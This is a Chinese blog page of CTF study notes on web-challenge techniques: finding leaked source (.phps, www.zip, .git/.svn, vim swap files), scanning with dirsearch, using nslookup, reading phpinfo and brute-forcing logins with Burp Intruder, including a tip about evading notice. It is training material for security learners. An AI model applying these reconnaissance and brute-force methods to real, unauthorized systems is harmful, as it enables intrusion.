<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="此时相望不相闻，愿逐月华流照君" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="此时相望不相闻，愿逐月华流照君" type="application/atom+xml"><link rel="alternate" type="application/json" title="此时相望不相闻，愿逐月华流照君" href="https://vvwwvv.cn/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.3.5"><script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.js"></script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/><link rel="canonical" href="https://vvwwvv.cn/2025/05/19/web/web%E7%9F%A5%E8%AF%86/"><title></title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline"></h1><div class="meta"><span class="item" title="创建时间：2025-05-19 20:53:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2025-05-19T20:53:00+08:00">2025-05-19</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>74k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>1:07</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">vvwwv'Blog</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="https://ooo.0x0.ooo/2023/03/09/Y0xvg.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://vvwwvv.cn/2025/05/19/web/web%E7%9F%A5%E8%AF%86/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="vvwwv"/><meta itemprop="description" content=", "/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="此时相望不相闻，愿逐月华流照君"/></span><div class="body md" itemprop="articleBody"><p>---<br />
title: ctfshow_web 常用方法<br />
 date: 2023-09-24 17:08:15<br />
categories:<br />
- CTF<br />
- ctfshow<br />
tags:<br />
- web<br />
---</p>
<h1 id="1抓包"><a class="anchor" href="#1抓包">#</a> 1. 抓包</h1>
<p>web 抓包：火狐浏览器 &lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjQxMjMwMjE1MTAzNzM2LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20241230215103736.png</span>&quot; alt=&quot;image-20241230215103736&quot; style=&quot;zoom:67%;&quot; /&gt;</p>
<p>，同时 burp 中点 <code>proxy</code> ，在 <code>Action</code>  中发送到 <code>Repeater</code> ，看见 <code>response</code>  中的反馈信息</p>
<p><strong>注意：有验证情况下，但 bp 抓包没抓到，说明是前端验证</strong></p>
<h1 id="2robots协议"><a class="anchor" href="#2robots协议">#</a> 2.robots 协议</h1>
<p>robots 是搜索引擎爬虫协议，robots 是告诉搜索引擎，你可以爬取收录我的什么页面，你不可以爬取和收录我的那些页面。robots 很好的控制网站那些页面可以被爬取，那些页面不可以被爬取。</p>
<p><strong>robots 文件必须要存放在网站的<span class="exturl" data-url="aHR0cHM6Ly96aGlkYS56aGlodS5jb20vc2VhcmNoP2NvbnRlbnRfaWQ9MTY0MjU3NDkyJmFtcDtjb250ZW50X3R5cGU9QXJ0aWNsZSZhbXA7bWF0Y2hfb3JkZXI9MSZhbXA7cT0lRTYlQTAlQjklRTclOUIlQUUlRTUlQkQlOTUmYW1wO3poaWRhX3NvdXJjZT1lbnRpdHk=">根目录</span>下</strong>。可以利用 robots 文件获知网站框架，访问 robots 也就是 域名 /robots.txt 是可以访问文件的。你们也可以尝试访问别人网站的<span class="exturl" data-url="aHR0cHM6Ly96aGlkYS56aGlodS5jb20vc2VhcmNoP2NvbnRlbnRfaWQ9MTY0MjU3NDkyJmFtcDtjb250ZW50X3R5cGU9QXJ0aWNsZSZhbXA7bWF0Y2hfb3JkZXI9NSZhbXA7cT1yb2JvdHMlRTYlOTYlODclRTQlQkIlQjYmYW1wO3poaWRhX3NvdXJjZT1lbnRpdHk="> robots 文件</span>。 输入 url/robots.txt 即可访问。 注意 robots 是 <code>robots.txt文件</code> <img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20241231020732818.png" alt="image-20241231020732818" /></p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjQxMjMxMDIxMTU1NDg2LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20241231021155486.png</span>&quot; alt=&quot;image-20241231021155486&quot; style=&quot;zoom:67%;&quot; /&gt;</p>
<h1 id="3php文件泄露"><a class="anchor" href="#3php文件泄露">#</a> 3.php 文件泄露</h1>
<p><strong>phps 文件</strong>就是 php 的源代码文件，通常用于提供给用户（访问者）直接通过 Web 浏览器查看 php 代码的内容。</p>
<p>因为用户无法直接通过 Web 浏览器 “看到” php 文件的内容，所以需要用 phps 文件代替。用户访问 phps 文件就能看到对应的 php 文件的源码。可以通过访问 <code>index.phps</code>  来进行，会自动下载 php 源代码文件</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20241231022152208.png" alt="image-20241231022152208" /></p>
<h1 id="4使用dirsearch进行目录扫描"><a class="anchor" href="#4使用dirsearch进行目录扫描">#</a> 4. 使用 dirsearch 进行目录扫描</h1>
<p>在 <code>D:\CTF\dirsearch-master (2)\dirsearch-master</code>  目录下进行使用命令 <code>dirsearch-master&gt;dirsearch.py -u url </code> 进行扫描</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20241231024041687.png" alt="image-20241231024041687" /></p>
<ul>
<li>在 db 文件中是自带的字典文件夹，其中 <code>dicc.txt</code>  中可以进行手动添加列表（如 index.php.swp）</li>
<li>reports 为扫描日志文件夹</li>
</ul>
<h2 id="命令"><a class="anchor" href="#命令">#</a> 命令：</h2>
<ul>
<li>
<p>-u url ：指定 url</p>
</li>
<li>
<p>-l urls.txt：从文件中读取多个 url</p>
</li>
<li>
<p>-t 10：指定扫描线程数（默认 20）</p>
</li>
<li>
<p>--delay 500：设置每次请求之间的延迟</p>
</li>
<li>
<p>--proxy 使用代理服务器</p>
</li>
<li>
<p>-r ：递归扫描找到的目录</p>
</li>
<li>
<p>-R 3：设置递归扫描最大深度为 3</p>
<p><code>例如：dirsearch.py -u http://example.com -e php,html,js -w /path/to/wordlist.txt -x 404,403 -t 20 --timeout=5 --proxy=http://127.0.0.1:8080 --output=result.txt</code></p>
</li>
</ul>
<h1 id="5源码压缩包泄露"><a class="anchor" href="#5源码压缩包泄露">#</a> 5. 源码压缩包泄露</h1>
<h5 id="访问压缩包所以直接访问wwwzip即可下载源码压缩包其中因为网站的文件都放在www下面所以直接访问wwwzip就可以得到网页的源码压缩包压缩包的后缀一般是常见的zip-gz-targz-rar"><a class="anchor" href="#访问压缩包所以直接访问wwwzip即可下载源码压缩包其中因为网站的文件都放在www下面所以直接访问wwwzip就可以得到网页的源码压缩包压缩包的后缀一般是常见的zip-gz-targz-rar">#</a> 访问压缩包，所以直接访问 /www.zip，即可下载源码压缩包，其中因为 <code>网站的文件都放在www下面</code> ，所以直接访问 /www.zip 就可以得到网页的源码压缩包 (压缩包的后缀一般是常见的 zip、gz、tar.gz、rar)</h5>
<h1 id="6版本控制"><a class="anchor" href="#6版本控制">#</a> 6. 版本控制</h1>
<p>常用的版本 <code>控制工具git</code> ， <code>svn</code> ，尝试访问 <code>url/.git</code>  和 <code>url/.svn</code></p>
<p><code>SVN（subversion）源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，包含重要的源代码信息,开发管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，导致.svn隐藏文件夹被暴露于外网环境</code>  (Linux 上用 ls 命令看不到，要用 ls -al 命令)</p>
<h1 id="7生产环境vimvi"><a class="anchor" href="#7生产环境vimvi">#</a> 7. 生产环境 vim/vi</h1>
<p>当运维人员在 Linux 生产环境下使用 <code>vim/vi</code>  修改文件时，</p>
<ul>
<li>
<p>发生意外时会产生一个后缀为 <code>.swp</code>  的隐藏文件，(后缀是在原本文件名后加上的)</p>
</li>
<li>
<p>第二次意外退出的时候生成的备份文件后缀为： <code>.swo</code></p>
</li>
<li>
<p>第三次意外退出的时候生成的备份文件后缀为： <code>.swn</code></p>
</li>
</ul>
<p><code>以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn</code></p>
<h1 id="8cookie"><a class="anchor" href="#8cookie">#</a> 8.cookie</h1>
<p>火狐浏览器，F12，存储，查看 cookie</p>
<h1 id="9cyberchef离线版"><a class="anchor" href="#9cyberchef离线版">#</a> 9.CyberChef 离线版</h1>
<p>在本地文件夹 ctftools 中访问 CyberChef_v [].html（&quot;E:\ctftools\CyberChef_v10.19.4\CyberChef_v10.19.4.html&quot;），打开即可</p>
<h1 id="10域名解析"><a class="anchor" href="#10域名解析">#</a> 10. 域名解析</h1>
<p>在 cmd 中使用 nslookup 命令：</p>
<ul>
<li>
<p>查询域名解析地址 基本格式：nslookup host [server]</p>
</li>
<li>
<p>查询域名的指定解析类型的解析记录 基本格式：nslookup -type=type host [server]</p>
<p>type 可以是：</p>
<ul>
<li>A 地址记录 (默认)</li>
<li>AAAA 地址记录</li>
<li>AFSDB Andrew 文件系统数据库服务器记录</li>
<li>ATMA ATM 地址记录</li>
<li>CNAME 别名记录</li>
<li>HINFO 硬件配置记录，包括 CPU、操作系统信息</li>
<li>ISDN 域名对应的 ISDN 号码</li>
<li>MB 存放指定邮箱的服务器</li>
<li>MG 邮件组记录</li>
<li>MINFO 邮件组和邮箱的信息记录</li>
<li>MR 改名的邮箱记录</li>
<li>MX 邮件服务器记录</li>
<li>NS 名字服务器记录</li>
<li>PTR 反向记录</li>
<li>RP 负责人记录</li>
<li>RT 路由穿透记录</li>
<li>SRV TCP 服务器信息记录</li>
<li>TXT 域名对应的文本信息</li>
<li>X25 域名对应的 X.25 地址记录</li>
</ul>
</li>
<li>
<p>查询全部 基本格式：nslookup -query=any host [server]</p>
</li>
</ul>
<p>（例如编辑 nslookup -query=any <span class="exturl" data-url="aHR0cDovL2ZsYWcuY3Rmc2hvdy5jb20=">flag.ctfshow.com</span>，使用 nslookup -query=any 域名 来查询所有解析历史）</p>
<p>（ <code>-querytype</code>  和  <code>-type</code>  的效用一致，可以简写为  <code>-q</code>  和  <code>-ty</code> ，其在不指定类型的情况下默认查询类型为 <strong>A</strong>）</p>
<h1 id="11弱密码爆破"><a class="anchor" href="#11弱密码爆破">#</a> 11 弱密码爆破</h1>
<h1 id="12技术文档带有敏感信息"><a class="anchor" href="#12技术文档带有敏感信息">#</a> 12. 技术文档带有敏感信息</h1>
<p>设法找到网站的技术文档（可能在源代码中有暗示如 <code>document.pdf</code> ，访问即可）</p>
<h1 id="13编辑器"><a class="anchor" href="#13编辑器">#</a> 13. 编辑器</h1>
<p>网页编辑器 (editor) 中 <code>插入文件</code> 功能可能可以看到服务器所有目录文件，由此得到 flag 的路径</p>
<h1 id="14尝试网页的各个功能"><a class="anchor" href="#14尝试网页的各个功能">#</a> 14. 尝试网页的各个功能</h1>
<p>尽量将网页的各个功能都试一下，（登录及修改密码都看看），可能会找到相关的方法</p>
<h1 id="15探针"><a class="anchor" href="#15探针">#</a> 15. 探针</h1>
<p>探针，一般是用来检测服务器的运载负载情况的，以及检测服务器 WEB 环境软件版本兼容度的。比如我们有些时候 WEB 环境需要某个软件的某个版本支持，于是会用探针检测是否有安置和检测版本。</p>
<ul>
<li>
<p><strong>phpinfo</strong>:PHP 自带，可以查看当前大部分的软件版本，打开这个 <code>info.php</code>  页面，可以看到探针情况</p>
</li>
<li>
<p><strong>雅黑探针</strong>：访问 <code>tz.php</code>  即可查看自己的服务器信息</p>
<ul>
<li>比较齐全的可支持 PHP 探针工具，雅黑探针一般用于 PHP 缓解，可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息，1 秒钟刷新一次。以及包括服务器 IP 地址，Web 服务器环境监测，php 等信息。</li>
</ul>
</li>
<li>
<p><strong>UPUPW PHP 探针</strong>：访问 <code>u.php</code>  即可</p>
<ul>
<li>探针的优势是在检测 PHP 信息的同时，又可以防止你忘记删除探针或被搜索引擎缓存了探针快照的情况下避免配置路径和 phpinfo 信息的暴露。因为你随便去搜索引擎都能搜索到很多 php 探针，还全都暴露了网站路径、配置地址，有的甚至能访问到 phpinfo 页面，如果你也忘记删除探针或被搜索引擎保存了快照，那么这些信息可能给服务器带来安全威胁。</li>
</ul>
</li>
<li>
<p><strong>自建探针工具</strong>：一些 PHP 探针是用户自定义的 PHP 脚本，网站有提供的 PHP 用户自建的探针脚本工具</p>
</li>
</ul>
<h1 id="16phpinfo"><a class="anchor" href="#16phpinfo">#</a> 16.phpinfo</h1>
<p>输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 授权信息（License）</p>
<p>每个系统安装得有所不同，<strong>phpinfo()</strong> 常用于在系统上检查<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvY29uZmlndXJhdGlvbi5waHA=">配置设置</span>和<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvbGFuZ3VhZ2UudmFyaWFibGVzLnByZWRlZmluZWQucGhw">预定义变量</span>。</p>
<p><strong>phpinfo()</strong> 同时是个很有价值的、包含所有 EGPCS (Environment、GET、POST、Cookie、Server) 数据的调试工具</p>
<h1 id="17查看js文件"><a class="anchor" href="#17查看js文件">#</a> 17. 查看 js 文件</h1>
<p>再网页中（火狐浏览器）F12，点击网络，找到 js 类型，双击后会打开相应的 js 文件内容；或者在调试器中找到 js 文件，下面终端可以进行赋值等操作，<strong>点击代码行数下断点</strong></p>
<p><code>js文件是JavaScript（通常缩写为js）语言的源代码文件。JavaScript是互联网上最流行的脚本语言，已经被广泛用于Web应用开发，常用来为网页添加各式各样的动态功能，为用户提供更流畅美观的浏览效果。通常JS文件是通过嵌入在.HTML中来实现自身的功能的</code></p>
<p><code>js是javascript文件的扩展名，例如xx.js，javascript是一种程序语言，主要用于网页的特效、功能的脚本编程，是一种很强大的脚本语言，在网站的前台处理几乎是无所不能。js是javascript是缩写，js是网页前台脚本，几乎所见的网页效果都是JS的功劳，如果没有JS网页将变得呆板。JScript 是一种解释型的、基于对象的脚本语言</code></p>
<h1 id="18unicode编码"><a class="anchor" href="#18unicode编码">#</a> 18.unicode 编码</h1>
<p>​	<strong>Unicode</strong>，全称为<strong> Unicode 标准</strong>（The Unicode Standard），又译作<strong>万国码</strong>、统一字符码、统一字符编码 [<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVW5pY29kZSNjaXRlX25vdGUtMg==">2]</span>，是<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJGJUExJUU2JTgxJUFGJUU2JThBJTgwJUU2JTlDJUFG">信息技术</span>领域的业界<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JUEwJTg3JUU1JTg3JTg2">标准</span>，其整理、编码了世界上大部分的<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTk2JTg3JUU1JUFEJTk3JUU3JUIzJUJCJUU3JUI1JUIx">文字系统</span>，使得<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU5JTlCJUJCJUU4JTg1JUE2">电脑</span>能以通用划一的<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JUFEJTk3JUU1JTg1JTgzJUU3JUI3JUE4JUU3JUEyJUJD">字符集</span>来处理和显示文字</p>
<p>解码：cyberchef 中利用 <code>Unescape Unicode Characters</code>  进行取消转义</p>
<p>特征：<strong>常会用 “U” 然后紧接着 4 个十六进制的数字来表示这一个字符</strong>。在零号平面以外的字符则需要使用五或六个数字。旧版的 Unicode 标准使用相近的标记方法，但却有些微小差异：在 Unicode 3.0 里使用 “U-” 然后紧接着八个数字，而 “U+” 则必须随后紧接着四个数字（如 \u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b）</p>
<h1 id="19burpsuite爆破"><a class="anchor" href="#19burpsuite爆破">#</a> 19.BurpSuite 爆破</h1>
<h2 id="流程"><a class="anchor" href="#流程">#</a> 流程</h2>
<h3 id="1抓包发送到intruder"><a class="anchor" href="#1抓包发送到intruder">#</a> 1. 抓包发送到 intruder</h3>
<ul>
<li>选择攻击模式（choose an attack type）</li>
<li>选择要修改的参数位置（ <code>add$</code> ）</li>
</ul>
<h3 id="2选择payloads"><a class="anchor" href="#2选择payloads">#</a> 2. 选择 payloads</h3>
<ul>
<li>设置爆破字典</li>
<li>对每个位置（position）选择字典</li>
<li>根据抓包内容将用字典构造的内容转为相应的编码 ( <code>利用payload processing</code> )</li>
<li>看是否需要编码的后缀特征符号（如 base64 的 <code>===</code>  等），需要的话不要勾选 <code>payload encoding</code> , 不然会将 <code>=</code>  进行 ** <code>url编码</code>  **</li>
</ul>
<h3 id="3爆破"><a class="anchor" href="#3爆破">#</a> 3. 爆破</h3>
<p>在爆破结果中找 <code>status</code>  为 200 等不同值，查看 response...</p>
<h2 id="功能说明"><a class="anchor" href="#功能说明">#</a> 功能说明：</h2>
<h3 id="positions"><a class="anchor" href="#positions">#</a> Positions</h3>
<h4 id="1choose-an-attack-type选择攻击模式"><a class="anchor" href="#1choose-an-attack-type选择攻击模式">#</a> 1.choose an attack type (选择攻击模式)</h4>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTUzMTM2NTkwLnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102153136590.png</span>&quot; alt=&quot;image-20250102153136590&quot; style=&quot;zoom:80%;&quot; /&gt;</p>
<ul>
<li>**Sniper:** 狙击手模式，顾名思义，字典里取一行，打一发请求（只能有一个字典，一个参数保持初始值不变，另一个遍历字典，如：pwd 为初始值（123）不变，name 用字典遍历一遍，然后 name 为初始值（123）不变，pwd 用字典遍历一遍)</li>
<li><strong>Battering ram</strong>：散弹枪模式，顾名思义，字典里取一行，打一发请求。相同的输入放到多个位置的情况，所有位置填充一样的值（只能用一个字典）。</li>
<li><strong>Pitchfork</strong>：音叉模式，顾名思义，相当于大合唱中有默契地各干各的事情，每个位置都有一个字典，打一发请求，<strong>大家一起取下一行</strong>。请求的数量由字典行最少哪位决定。（可以选 n（为参数个数）个字典）</li>
<li><strong>Cluster bomb</strong>：字典 1 和字典 2 的笛卡尔积。也就是将 name 替换为字典 1 中的参数 1，然后 pwd 遍历字典 2，然后将 name 替换为字典 1 中的参数 2，然后 pwd 遍历字典 2……
<ul>
<li>集束炸弹，顾名思义，爆炸时迸射出许多小炸弹的集束炸弹，最复杂的一个模式，类似于数学中的笛卡尔积，每个位置都有一个字典，通常字典数量不超过 3 个，不然破解过程很漫长，可能要等到下次宇宙大爆炸。（也是 n 个字典）</li>
</ul>
</li>
</ul>
<h4 id="2payload-positions"><a class="anchor" href="#2payload-positions">#</a> 2.payload positions</h4>
<p>使用 <code>$</code>  符号将要爆破修改的参数给围起来 (对于一个参数，可以用一对 <code>$$</code>  然后设置多个 position 进行拼接放这一个位置)：&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTUzNzA4MzUzLnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102153708353.png</span>&quot; alt=&quot;image-20250102153708353&quot; style=&quot;zoom:67%;&quot; /&gt;</p>
<h3 id="payloads"><a class="anchor" href="#payloads">#</a> Payloads</h3>
<p>指定‘字典’，及每一次取出字典时，是否要进一步编码字典等</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102154156078.png" alt="image-20250102154156078" /></p>
<ul>
<li>Simple list：一个字典列表</li>
<li>Customiterator：就是多字符串拼接</li>
</ul>
<p>固定长度爆破：</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102155840500.png" alt="image-20250102155840500" /></p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTU0MzM1NjM5LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102154335639.png</span>&quot; alt=&quot;image-20250102154335639&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>
<p><strong>对 payload 进行编码或解码：</strong>（根据抓包看要发送的信息是什么编码，将字典的内容转为对应编码再发送）</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102160205430.png" alt="image-20250102160205430" /></p>
<p>生成的 Payload 进行编码、加密、截取等操作</p>
<blockquote>
<p>注意：Payload Encoding 操作发生在 Payload Processing 操作之后，它作用于整个 URL。</p>
</blockquote>
<h3 id="resource-pool"><a class="anchor" href="#resource-pool">#</a> Resource pool</h3>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTcwNjM5MTA4LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102170639108.png</span>&quot; alt=&quot;image-20250102170639108&quot; style=&quot;zoom:67%;&quot; /&gt;</p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTcwNzIxOTkyLnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102170721992.png</span>&quot; alt=&quot;image-20250102170721992&quot; style=&quot;zoom:67%;&quot; /&gt;</p>
<p>这里描述的是线程数，也就是并发线程，同时爆破的次数（在同一时间提交的请求个数），注意不要太快，容易被发现或者把服务器打崩溃，在下面的创建新资源池可以修改。</p>
<h3 id="settings"><a class="anchor" href="#settings">#</a> Settings:</h3>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTYxMjA0Njc2LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102161204676.png</span>&quot; alt=&quot;image-20250102161204676&quot; style=&quot;zoom:80%;&quot; /&gt;</p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTYxMjMwMzA0LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102161230304.png</span>&quot; alt=&quot;image-20250102161230304&quot; style=&quot;zoom:80%;&quot; /&gt;</p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTYxMjQ4MzcxLnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102161248371.png</span>&quot; alt=&quot;image-20250102161248371&quot; style=&quot;zoom:80%;&quot; /&gt;</p>
<h1 id="authorization请求头"><a class="anchor" href="#authorization请求头">#</a> Authorization 请求头</h1>
<p>HTTP Authorization 请求头部主要用于客户端向服务端传递用户认证凭据，如用户名和密码等，其格式通常是：</p>
<p><code>Authorization: &lt;type&gt; &lt;credentials&gt;</code></p>
<p>例如：&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTYyMzI5NzI3LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102162329727.png</span>&quot; alt=&quot;image-20250102162329727&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTYyMzQ1MTMwLnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102162345130.png</span>&quot; alt=&quot;image-20250102162345130&quot; style=&quot;zoom:50%;&quot; /&gt;</p>
<p>​		<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSFRUUC9IZWFkZXJzL0F1dGhvcml6YXRpb24=">HTTP Authorization </span>头是一个用于在客户端与服务器之间传送认证凭证的 HTTP 请求头。它允许用户代理（比如 web 浏览器）向服务器提供身份验证信息，以响应服务器的身份验证请求。这类请求一般出现在服务器需要验证请求者是否有权访问某个资源时。Authorization 头是 HTTP 协议中定义的标准字段之一，其值通常包含凭证信息，如用户名和密码，或者是一个令牌，如 OAuth 或 JWT（JSON Web Token）。</p>
<p>​		在 Web 安全领域，HTTP Authorization 头扮演着至关重要的角色。通过利用这个头部，服务器能够确保只有授权的用户可以访问敏感数据或执行特定的操作。无论是普通的网页访问、网页应用程序、API 调用还是其他基于 HTTP 的交互，避免未授权访问是维护系统安全的关键组成部分。如果 Authorization 头中的凭证泄露或被不正确处理，可能会导致安全漏洞，如身份盗用或数据泄漏，从而威胁到整个 Web 应用程序的安全和用户的隐私。</p>
<h3 id="使用-authorization-头进行用户认证"><a class="anchor" href="#使用-authorization-头进行用户认证">#</a> 使用 Authorization 头进行用户认证</h3>
<p>要使用 <code>Authorization</code>  头进行用户认证，客户端首先需要知道服务器所需的认证类型，这通常通过服务器的 <code>WWW-Authenticate</code>  头在 <strong>401 响应</strong>中给出。然后，客户端将根据认证类型构造相应的凭据。（可以从抓包的 response 中看到）</p>
<h4 id="1基本认证basic-authentication"><a class="anchor" href="#1基本认证basic-authentication">#</a> 1. 基本认证（Basic Authentication）：</h4>
<p>基本认证是最简单的 HTTP 认证机制。</p>
